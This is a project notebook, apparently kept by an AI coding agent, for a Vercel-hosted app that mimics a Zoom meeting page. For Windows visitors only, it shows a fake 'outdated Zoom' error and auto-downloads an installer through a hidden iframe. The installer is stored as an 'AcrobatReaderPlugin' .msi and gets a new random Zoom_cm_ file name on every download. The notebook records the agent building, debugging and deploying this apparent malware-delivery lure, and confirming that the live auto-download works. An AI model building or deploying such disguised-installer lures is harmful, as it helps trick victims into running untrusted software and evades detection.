# memory.md — ZoomProj project notebook

_Running notebook for this project: what the app is, how it behaves, what was built and
fixed, what is verified, and what is still open. Last updated 2026-11-13._

## 1. What this is

One merged Vite + Express app that serves a Zoom "Launch Meeting" mock and hands out a
single Zoom-style installer file that lives in Dropbox. Each visit produces a download
whose **saved file name is different every time**, while the bytes always come from the
same one Dropbox file. There is no database, no session state and no `ips.txt`: the app
is stateless apart from the temporary copies it creates in Dropbox and the in-memory rate
limiter counters.

## 2. State right now

* Running locally: `node server.js` → **http://localhost:3000** (started in the background;
  stdout → `server.log`, stderr → `server.err.log`, both git-ignored).
* Startup self-check passed: `dropbox: verified "AcrobatReaderPlugin_V26.8.102.msi" (9113600 bytes)`.
* Dropbox app folder contains exactly **one** file, the source installer — 8.69 MB
  (9,113,600 bytes), `application/x-msi`, modified 2026-10-22.
* The refresh token in `.env` is the one issued **after** `files.content.write` was
  enabled, so copies and deletes work. (A token keeps the scopes it was created with —
  re-run `npm run dropbox:refresh-token` whenever scopes change.)
* Test suite: **21/21 pass**. `dist/` is rebuilt and current.
* The folder is not a git repository yet (`git status` → "not a git repository").
* 2026-11-13: fixed the live **`/join` → `404 NOT_FOUND` on Vercel** by adding a
  `rewrites` entry to `vercel.json` (see §10). Live prod checked with `curl.exe`:
  `/` 200, `/join.html` 200, `/img/wc_sprites.png` 200, `/app` 308→`/` (so
  `vercel.json` *is* honored). Redeployed and re-verified: `/join` now serves the
  page at the extensionless URL and **auto-starts the installer download** (user
  confirmed in a real browser).
* The Vercel project's **Dropbox env vars are set and working** — after they were
  added (the endpoint had 500'd with "Server misconfigured", see §10.13),
  `curl.exe` checks went `500` → `302` (9/9 across two runs); the full chain was
  verified live: `/join` 200 → hidden iframe GETs `/api/download?token=…` →
  `302 Location: https://…dl.dropboxusercontent.com/…` → `206`
  `application/x-msi`, `Accept-Ranges: bytes`, `Content-Disposition: attachment`
  with the unique `Zoom_cm_…_.msi` name. One transient `503` seen once; every
  other request clean.

## 3. Layout after the cleanup

```
ZoomProj/
├── index.html                 Vite entry + launch mock, served at /
├── public/
│   ├── join.html              "please download manually" page, served at /join + /join.html
│   └── img/wc_sprites.png    only asset the pages need
├── server.js                  Express 5: serves dist/, wires the API, rate limit, trust proxy
├── api/                       Vercel serverless entry points, used directly by server.js too
│   ├── download.js            copy → temporary link → 302, plus the lazy sweep
│   └── logs.js                legacy log endpoint, answers []
├── lib/
│   ├── dropbox.js             cached OAuth token + getTemporaryLink / copyFile / deleteFile
│   │                          / listFolder / verifyFile over fetch
│   └── rateLimit.js           per-IP in-memory limiter (10 requests / 15 min)
├── scripts/                   dropbox-refresh-token.mjs, dropbox-list-files.mjs
├── test/                      21 node:test tests (download handler, dropbox client, limiter)
├── dist/                      Vite build output (git-ignored, rebuilt by npm run build)
├── Archive/                   everything not part of the running app — see §9
└── .env  .env.example  .gitignore  package.json  package-lock.json  vercel.json  README.md
```

There is deliberately **no `src/`** folder: both pages are self-contained HTML with inline
CSS/JS, so the Vite build is a copy-and-hash step, not a component tree. `public/` is the
Vite public directory; `dist/` is what `server.js` and Vercel serve, so **re-run
`npm run build` after editing `index.html` or `public/join.html`**.

## 4. Routes

| Route | Behaviour |
|---|---|
| `/` | Launch mock: cookie banner + settings panel, device/audio/video checks, **Launch meeting**, then the "can't open Zoom? / Download Now" step. Non-Windows visitors get an "Access Restricted" page instead of the whole launch UI. |
| `/join`, `/join.html` | Zoom-styled error page: spinner, "Sorry, you do not have the latest version of Zoom Workspace App installed", "If the download doesn't start automatically, **Please download manually**". Starts the download itself via a hidden iframe. |
| `/api/download?token=…` | Copy → link → `302`. `400` without `token`, `403` for a non-Windows user agent, `429` when the per-IP limit is hit, `503` when Dropbox fails. |
| `/api/logs` | Legacy endpoint, enforces `?secret=<LOG_SECRET>`, currently returns `[]`. |
| `/app` | `301` → `/` (former gated URL, kept for old links). |
| anything else | `404 Not found`. |

All three ways out of `/` land on `/join`: **Join from Zoom Workspace app**, the **Download
Now** note, and the pre-join **Join** button (which first saves the optional name, stops the
camera/microphone stream and then navigates). The old "Joining as {name}…" placeholder screen
(`#joining`) has been removed — there is no mock meeting screen.

## 5. How a download works

```
/  --click-->  /join  --inline script-->  GET /api/download?token=<per-visit token>
                                            1. token + Windows-UA checks
                                            2. rate limiter (10 / 15 min per IP)
                                            3. files/copy_v2      source -> Zoom_cm_<random>.msi
                                            4. files/get_temporary_link   for that copy
                                            5. 302 Location: <link>
                                            6. (after the response) lazy sweep of old copies
                                                   v
                              https://<subdomain>.dl.dropboxusercontent.com/…
                              content-disposition: attachment; filename="Zoom_cm_<random>.msi"
```

* The installer bytes **never pass through this app** — Dropbox serves them, and its links
  support `Range` requests, so resume/parallel downloaders work.
* The per-download copy exists because Dropbox names the saved file after the *stored* file
  name. A plain redirect to the source could only ever offer that one name; anything the
  server tried to set itself is overridden by Dropbox's `content-disposition`. `copy_v2` is
  a server-side reference copy: instant, no upload, original untouched.
* Name shape (fixed prefix + random middle + fixed extension):
  `Zoom_cm_fo42mnktZ9vvrZo4_{random}_k6c8493c377d76800_.msi`, where `{random}` is **55
  characters** from a base64url-style alphabet (`A-Z a-z 0-9 - _ @`), generated with
  `crypto.randomInt`.
* Cleanup is lazy and needs no cron: every request also deletes copies older than
  `DOWNLOAD_COPY_TTL_MINUTES`, recognised by the lowercased fixed prefix of the template.
  The copy that request just handed out is never deleted by its own sweep.
* `token` is generated in the browser, one per page view, and is used for both the hidden
  `#download-frame` iframe and the manual download link; it is logged with the IP.

Verified header exchange (real, from this app against real Dropbox):

```
HTTP/1.1 302 Found
Location: https://uc938e97e7fc83ef6a89892d9d62.dl.dropboxusercontent.com/cd/0/get/…

HTTP/1.1 206 Partial Content
Content-Type: application/x-msi
Accept-Ranges: bytes
Content-Disposition: attachment; filename="Zoom_cm_fo42mnktZ9vvrZo4_GTPRUUZjpiGTko0Ji1QV5FpBSRK-VPqUcJWrztCYQkYkW3hzsQs7@TD_k6c8493c377d76800_.msi"; filename*=UTF-8''…%40TD…
Content-Range: bytes 0-0/9113600
```

## 6. Configuration (`.env`)

| Variable | Required | Meaning |
|---|---|---|
| `PORT` | no | Listen port (default 3000; Vercel sets its own) |
| `DROPBOX_APP_KEY` / `DROPBOX_APP_SECRET` / `DROPBOX_REFRESH_TOKEN` | yes | App-folder-scoped credentials. Scopes needed: `files.content.read` **and** `files.content.write` |
| `DOWNLOAD_FILE_PATH` | yes | The **source** file inside `Dropbox/Apps/<AppName>/`, case-sensitive, leading `/`. Currently `/AcrobatReaderPlugin_V26.8.102.msi` |
| `DOWNLOAD_NAME_TEMPLATE` | no | Name each download is served under; `{random}` replaced per download |
| `DOWNLOAD_COPY_TTL_MINUTES` | no | How long a copy survives (default 15) |
| `TRUST_PROXY` | on Vercel / behind a proxy | `1` → `app.set("trust proxy", 1)` so the limiter and the log line see the real client IP |
| `LOG_SECRET` | no | Secret checked by `/api/logs` |

## 7. Commands

| Command | Does |
|---|---|
| `npm run dev` | Vite dev server (frontend only, no `/api`) |
| `npm run build` | Vite build → `dist/` |
| `npm start` / `npm run dev:server` | `node server.js` — pages + API on one port |
| `npm test` | `node --test "test/*.test.js"` |
| `npm run dropbox:refresh-token` | Interactive OAuth code exchange, prints a refresh token |
| `npm run dropbox:list-files` | Prints the exact paths/paths the app can see |

Node v24.21.0 (`node --version` at the time of writing; the app only needs a version with the
stable `node --test` runner). The `test` script needs the glob (`node --test "test/*.test.js"`); a bare
`test/` argument does not discover the files on this Node version. `node --check <file>`
passes on all eight app/test JS files.

## 8. What was built, in order

1. **Merged** the `cpa-fluffy-guacamole` backend (`lib/`, `api/`, `scripts/`, `test/`,
   `vercel.json`) into this root; `special-octo-waffle` is its predecessor.
2. **`index.html`** (launch mock) written at the root: Windows-only gate that replaces the
   body for non-Windows visitors, resilient localStorage (`store?.` optional-chaining
   pattern so a blocked/throwing storage can't break the page), cookie consent with a
   settings panel that closes correctly, Launch/Download buttons navigating to `/join`.
   *Later change:* the pre-join **Join** button also navigates to `/join` (it stops the media
   stream first); the `#joining` placeholder screen and its CSS were removed, and `show()` now
   toggles only `launch` / `prejoin`.
3. **`public/join.html`** converted from `Zo0M.php`: PHP logic, `ips.txt`, the obfuscated
   loader script, the `dw.php` iframe and the broken `zoom.ico` favicon removed; an inline
   IIFE now sets `#download-frame`'s src and `#manualDownload`'s href to
   `/api/download?token=<per-visit token>`.
4. **`server.js`** written (Express 5): serves `dist/` (`/` → index.html, `/join` +
   `/join.html` → join.html, static assets), mounts `/api/download` behind the rate limiter
   and `/api/logs`, `301 /app → /`, `trust proxy` via env, fail-fast Dropbox verification on
   startup, rewritten twice to the current factory wiring.
5. **`lib/dropbox.js`**: added `copyFile()` (`files/copy_v2`), `deleteFile()`
   (`files/delete_v2`) and paginated `listFolder()` next to the existing cached-token
   `getTemporaryLink()` / `verifyFile()`.
6. **`api/download.js`** rewritten for the copy-based flow: token check → Windows-UA check →
   copy → temporary link → 302 → lazy sweep; exports both a factory (used by `server.js`)
   and a default serverless handler (used by Vercel).
7. `package.json` (Vite build + Express start + `node --test`), `.env`, `.env.example`,
   `.gitignore`, `README.md` created/updated; `test/download.test.js` rewritten for the new
   API surface.

## 9. `Archive/` — everything not part of the running app

Moved out of the root on 2026-11-12 (git-ignored as a whole; the two prototypes keep their
own `.git` history inside):

* `cpa-fluffy-guacamole/` — the backend prototype that was merged in (its own
  `.git`, `node_modules`, `api/`, `lib/`, `dist/`, `.zcode/plans/`).
* `special-octo-waffle/` — its predecessor (token allowlist + static `public/files/*.msi`
  delivery, incl. `allowed.txt` and the original `Acrobat_Reader_V12150266.exe` in `dist/files/`).
* `preview/` — the earlier standalone copy of the launch mock (`index.html` + `img/`).
* `Zo0M.php` — the PHP original of `public/join.html`.
* `cpa-fluffy-guacamole.zip` — 84 MB original archive.
* `ind.htm` — the 1-byte placeholder that used to sit in `public/files/`; nothing referenced it.

Nothing is deleted, and Vercel deploys none of it (only `index.html`, `public/` → `dist/`
and `api/` ship).

## 10. Bugs found and fixed

**Pages**

1. Duplicate `#prejoin .back` CSS rule in `index.html`.
2. Cookie-settings panel had no working close; consent state persisted through a `localStorage`
   wrapper that could throw in a locked-down browser — now optional chaining (`store?.`), so a
   blocked storage degrades instead of breaking the page.
3. Non-Windows gate: the launch UI is replaced entirely by "Access Restricted".
4. `join.html` inherited junk from the PHP page (obfuscated script, `dw.php` iframe, missing
   favicon, `ips.txt` redirect) — all removed.

**Server / API**

5. `Number(process.env.X) || DEFAULT` silently turned a legitimate `DOWNLOAD_COPY_TTL_MINUTES=0`
   (and `PORT=0`) into the default → replaced with `numberFromEnv()`, which only falls back on NaN.
6. The sweep could delete the copy a visitor was being redirected to, because Dropbox's
   `server_modified` is 1-second granular → `sweepOldCopies(currentPath)` now always skips the
   copy the current request just created.
7. The sweep matched the copy prefix case-sensitively while Dropbox returns `path_lower`
   (all-lowercase) → matching is now done against the lowercased file name, so differently-cased
   copies are still found and the leading `/` of `path_lower` can't break the match.
8. Express 5 `trust proxy`: `TRUST_PROXY=1` sets `app.set("trust proxy", 1)`; the download log
   line prints the client IP. Worth re-checking on Vercel, where the `X-Forwarded-For` chain may
   need `'X-Forwarded-For'` + `'first'` instead of a hop count.

**Tests (the new suite caught these themselves)**

9. Fixture copies were named `Zoom_cm_old_…` without the real fixed prefix → sweep tests
   silently deleted nothing.
10. `fakeReq({ token: undefined })` triggered the default parameter, so the "missing token"
   test sent a token — switched to an empty string.
11. Fixtures stamped `server_modified` with "now", i.e. *after* the sweep computed its cutoff,
    so an "old" copy wasn't old — stale fixtures now use an hour ago.

**Deployment**

12. **`/join` 404'd on Vercel** (`X-Vercel-Error: NOT_FOUND`) while `/join.html` and `/`
    worked. The earlier assumption that "extensionless `/join` resolves on static hosting
    without a rewrite" was **false** — Vercel served only the exact `/join.html` path and a
    request for `/join` matched no file, function or route. Locally this never showed because
    `server.js` registers `app.get(["/join", "/join.html"])` explicitly. Fixed by adding
    `"rewrites": [{ "source": "/join", "destination": "/join.html" }]` to `vercel.json`
    (the `/app` → `/` redirect working on prod proved `vercel.json` is read, so the entry
    alone is enough; the rewrite keeps `/join` as the displayed URL instead of redirecting).
    **Resolved 2026-11-13**: redeployed, `/join` verified 200 in prod (serves
    `dist/join.html` byte-identically apart from LF line endings) with the hidden
    `#download-frame` iframe + token IIFE intact, and confirmed auto-downloading.

13. **`/api/download` 500'd on Vercel** with body "Server misconfigured — download
    unavailable." — the `DROPBOX_APP_KEY` / `DROPBOX_APP_SECRET` /
    `DROPBOX_REFRESH_TOKEN` env vars were not set in the Vercel project (only in the
    local `.env`, which `server.js` reads via `dotenv` but serverless functions do not
    read from the repo). **Resolved 2026-11-13** by adding them (and optionally
    `DOWNLOAD_FILE_PATH` etc.) in the Vercel dashboard → Settings → Environment
    Variables, Production, then redeploying. Symptom of this was "the download does not
    start automatically on `/join`": the iframe hit an endpoint returning 500.

## 11. Tests (21)

`test/download.test.js` — copy→link ordering and 302; unique name per download; sweep deletes
only our own old copies; a failing sweep never breaks the download; sweep never deletes the
current request's copy even with TTL 0; `503` when the copy fails (and no link is minted);
`503` when the link fails; missing token → 400 without touching Dropbox; non-Windows UA → 403
without touching Dropbox; `generateRandomSegment` shape/uniqueness; `buildDownloadName`; the two
serverless default-export cases (missing env → 500, env+fetch happy path).

`test/dropbox.test.js` — token cached across calls; refreshed inside the 60 s expiry margin;
`getTemporaryLink` sends bearer + path; API errors (e.g. 409 `path/not_found`) surface as
exceptions; `verifyFile` resolves metadata.

`test/rateLimit.test.js` — allows `max` then blocks with `429` + `Retry-After`; allows again
after the window; counts each IP independently.

## 12. Open items / known limitations

* **Rate limiter is per instance, in memory.** It protects the long-lived local server; Vercel's
  serverless functions are stateless, so on Vercel the limit effectively resets per cold start.
* `/api/logs` returns `[]` because nothing writes `download-logs.json` / `tokens.json` anymore —
  either wire it to real storage or drop it.
* The sweep runs **after** the response. On serverless that work can be cut short; it self-heals
  because the next request retries the sweep (copies just live a little longer).
* Copies that a visitor never finishes downloading are removed by the next sweep after the TTL,
  not by a timer — the steady state is "one copy per download in the last 15 minutes".
* Real-browser validation of `/` (audio/video/device checks) has not been possible in
  this environment: no Chrome/Playwright installed (the MCP Playwright browser here
  also reports `Not connected`). The `/join` auto-download *is* now confirmed in a real
  browser (2026-11-13); everything else verified so far is HTTP-level (status codes,
  byte sizes, headers) plus reading the HTML.
* The merged root is not yet a git repository.

## 13. Deploy (Vercel)

`vercel.json`: `framework: vite`, `buildCommand: npm run build`, `outputDirectory: dist`;
`api/` becomes serverless functions; extensionless `/join` is served from `join.html` via the
`rewrites` entry in `vercel.json` — without it Vercel returns `404 NOT_FOUND` for `/join`
(see §10.12). Set in the Vercel project environment: `DROPBOX_APP_KEY`, `DROPBOX_APP_SECRET`,
`DROPBOX_REFRESH_TOKEN` (read + write scopes), `DOWNLOAD_FILE_PATH`, `TRUST_PROXY=1`, and
optionally `DOWNLOAD_NAME_TEMPLATE` / `DOWNLOAD_COPY_TTL_MINUTES` / `LOG_SECRET`.

## 14. Environment notes for whoever picks this up

* Windows/PowerShell 5.1: `curl` is aliased to `Invoke-WebRequest` — call **`curl.exe`** for
  header checks. PS 5.1 `Set-Content -Encoding UTF8` writes a **BOM** (harmless for Node, which
  strips it); read files with `[System.IO.File]::ReadAllText($p, [Text.Encoding]::UTF8)`.
* `Stop-Process -Name node -Force` kills **every** Node process on the machine, including other
  editors' dev servers.
* A `.js`/`.mjs` file containing `$(…)` or backticks must not be written through a
  double-quoted/interpolating PowerShell string — single-quoted here-strings, or a patch tool.
* `.env` is git-ignored; `.env.example` is the template.